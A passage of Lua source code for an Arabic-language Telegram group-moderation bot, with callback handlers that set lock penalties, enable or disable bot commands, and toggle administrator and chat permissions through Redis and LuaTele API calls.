local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الالعاب").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_floodktm') then
local UserId = Text:match('(%d+)/lock_floodktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hset(darket.."Spam:Group:User"..ChatId ,"Spam:User","mute")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التكرار").lockKtm, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/lock_linkkick') then
local UserId = Text:match('(%d+)/lock_linkkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Link"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الروابط").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_spamkick') then
local UserId = Text:match('(%d+)/lock_spamkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Spam"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الكلايش").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_keypordkick') then
local UserId = Text:match('(%d+)/lock_keypordkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Keyboard"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الكيبورد").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_voicekick') then
local UserId = Text:match('(%d+)/lock_voicekick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:vico"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الاغاني").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gifkick') then
local UserId = Text:match('(%d+)/lock_gifkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Animation"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل المتحركات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fileskick') then
local UserId = Text:match('(%d+)/lock_fileskick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Document"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الملفات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videokick') then
local UserId = Text:match('(%d+)/lock_videokick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Video"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الفيديو").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_photokick') then
local UserId = Text:match('(%d+)/lock_photokick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Photo"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الصور").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_usernamekick') then
local UserId = Text:match('(%d+)/lock_usernamekick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:User:Name"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل المعرفات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tagskick') then
local UserId = Text:match('(%d+)/lock_tagskick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:hashtak"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التاك").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fwdkick') then
local UserId = Text:match('(%d+)/lock_fwdkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:forward"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التوجيه").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_audiokick') then
local UserId = Text:match('(%d+)/lock_audiokick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Audio"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الصوت").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_stikearkick') then
local UserId = Text:match('(%d+)/lock_stikearkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Sticker"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الملصقات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_phonekick') then
local UserId = Text:match('(%d+)/lock_phonekick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Contact"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الجهات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videonotekick') then
local UserId = Text:match('(%d+)/lock_videonotekick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Unsupported"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل بصمه الفيديو").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_markdaunkick') then
local UserId = Text:match('(%d+)/lock_markdaunkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Markdaun"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الماركدون").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gameskick') then
local UserId = Text:match('(%d+)/lock_gameskick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:geam"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الالعاب").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_floodkick') then
local UserId = Text:match('(%d+)/lock_floodkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hset(darket.."Spam:Group:User"..ChatId ,"Spam:User","kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التكرار").lockKick, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/unmute_link') then
local UserId = Text:match('(%d+)/unmute_link')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:Link"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر الرابط").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_welcome') then
local UserId = Text:match('(%d+)/unmute_welcome')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:Welcome"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر الترحيب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_Id') then
local UserId = Text:match('(%d+)/unmute_Id')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:Id"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر الايدي").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_IdPhoto') then
local UserId = Text:match('(%d+)/unmute_IdPhoto')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:IdPhoto"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر الايدي بالصوره").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_ryple') then
local UserId = Text:match('(%d+)/unmute_ryple')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:Reply"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر الردود").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_ryplesudo') then
local UserId = Text:match('(%d+)/unmute_ryplesudo')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:ReplySudo"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر الردود العامه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_setadmib') then
local UserId = Text:match('(%d+)/unmute_setadmib')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:SetId"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر الرفع").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_kickmembars') then
local UserId = Text:match('(%d+)/unmute_kickmembars')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:BanId"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر الطرد - الحظر").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_games') then
local UserId = Text:match('(%d+)/unmute_games')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:Games"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر الالعاب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_kickme') then
local UserId = Text:match('(%d+)/unmute_kickme')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:KickMe"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تعطيل امر اطردني").unLock, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/mute_link') then
local UserId = Text:match('(%d+)/mute_link')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:Link"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر الرابط").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_welcome') then
local UserId = Text:match('(%d+)/mute_welcome')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:Welcome"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر الترحيب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_Id') then
local UserId = Text:match('(%d+)/mute_Id')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:Id"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر الايدي").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_IdPhoto') then
local UserId = Text:match('(%d+)/mute_IdPhoto')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:IdPhoto"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر الايدي بالصوره").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_ryple') then
local UserId = Text:match('(%d+)/mute_ryple')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:Reply"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر الردود").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_ryplesudo') then
local UserId = Text:match('(%d+)/mute_ryplesudo')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(darket.."Status:ReplySudo"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر الردود العامه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_setadmib') then
local UserId = Text:match('(%d+)/mute_setadmib')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:SetId"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر الرفع").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_kickmembars') then
local UserId = Text:match('(%d+)/mute_kickmembars')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:BanId"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر الطرد - الحظر").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_games') then
local UserId = Text:match('(%d+)/mute_games')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:Games"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر الالعاب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_kickme') then
local UserId = Text:match('(%d+)/mute_kickme')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Status:KickMe"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم تفعيل امر اطردني").unLock, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/Fdmin@(.*)') then
local UserId = {Text:match('(%d+)/Fdmin@(.*)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
local Info_Members = LuaTele.getSupergroupMembers(UserId[2], "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
y = 0
for k, v in pairs(List_Members) do
if Info_Members.members[k].bot_info == nil then
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
Redis:sadd(darket.."Owners:Group"..UserId[2],v.member_id.user_id) 
x = x + 1
else
Redis:sadd(darket.."Admin:Group"..UserId[2],v.member_id.user_id) 
y = y + 1
end
end
end
LuaTele.answerCallbackQuery(data.id, "٠ تم ترقيه {"..y.."} ادمنيه \n٠ تم ترقية المالك ", true)
end
end
if Text and Text:match('(%d+)/LockAllGroup@(.*)') then
local UserId = {Text:match('(%d+)/LockAllGroup@(.*)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:set(darket.."Lock:tagservrbot"..UserId[2],true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
Redis:set(darket..''..lock..UserId[2],"del")    
end
LuaTele.answerCallbackQuery(data.id, "٠ تم قفل جميع الاوامر بنجاح  ", true)
end
end
if Text and Text:match('/leftgroup@(.*)') then
local UserId = Text:match('/leftgroup@(.*)')
LuaTele.answerCallbackQuery(data.id, "٠ تم مغادره البوت من الكروب", true)
LuaTele.leaveChat(UserId)
end


if Text and Text:match('(%d+)/groupNumseteng//(%d+)') then
local UserId = {Text:match('(%d+)/groupNumseteng//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
return GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id)
end
end
if Text and Text:match('(%d+)/groupNum1//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum1//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).change_info) == 1 then
LuaTele.answerCallbackQuery(data.id, "٠ تم تعطيل صلاحيه تغيير المعلومات", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,'❬ ❌ ❭',nil,nil,nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,0, 0, 0, 0,0,0,1,0})
else
LuaTele.answerCallbackQuery(data.id, "٠ تم تفعيل صلاحيه تغيير المعلومات", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,'❬ ✔️ ❭',nil,nil,nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,1, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum2//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum2//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).pin_messages) == 1 then
LuaTele.answerCallbackQuery(data.id, "٠ تم تعطيل صلاحيه التثبيت", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,'❬ ❌ ❭',nil,nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,0, GetAdminsNum(ChatId,UserId[2]).promote})
else
LuaTele.answerCallbackQuery(data.id, "٠ تم تفعيل صلاحيه التثبيت", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,'❬ ✔️ ❭',nil,nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,1, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum3//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum3//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).restrict_members) == 1 then
LuaTele.answerCallbackQuery(data.id, "٠ تم تعطيل صلاحيه الحظر", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,'❬ ❌ ❭',nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, 0 ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
else
LuaTele.answerCallbackQuery(data.id, "٠ تم تفعيل صلاحيه الحظر", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,'❬ ✔️ ❭',nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, 1 ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum4//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum4//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).invite_users) == 1 then
LuaTele.answerCallbackQuery(data.id, "٠ تم تعطيل صلاحيه دعوه المستخدمين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,'❬ ❌ ❭',nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, 0, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
else
LuaTele.answerCallbackQuery(data.id, "٠ تم تفعيل صلاحيه دعوه المستخدمين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,'❬ ✔️ ❭',nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, 1, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum5//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum5//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).delete_messages) == 1 then
LuaTele.answerCallbackQuery(data.id, "٠ تم تعطيل صلاحيه مسح الرسائل", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,'❬ ❌ ❭',nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, 0, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
else
LuaTele.answerCallbackQuery(data.id, "٠ تم تفعيل صلاحيه مسح الرسائل", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,'❬ ✔️ ❭',nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, 1, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum6//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum6//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).promote) == 1 then
LuaTele.answerCallbackQuery(data.id, "٠ تم تعطيل صلاحيه اضافه مشرفين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,nil,'❬ ❌ ❭')
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, 0})
else
LuaTele.answerCallbackQuery(data.id, "٠ تم تفعيل صلاحيه اضافه مشرفين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,nil,'❬ ✔️ ❭')
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, 1})
end
end
end

if Text and Text:match('(%d+)/web') then
local UserId = Text:match('(%d+)/web')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).web == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, false, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, true, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/info') then
local UserId = Text:match('(%d+)/info')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).info == true then
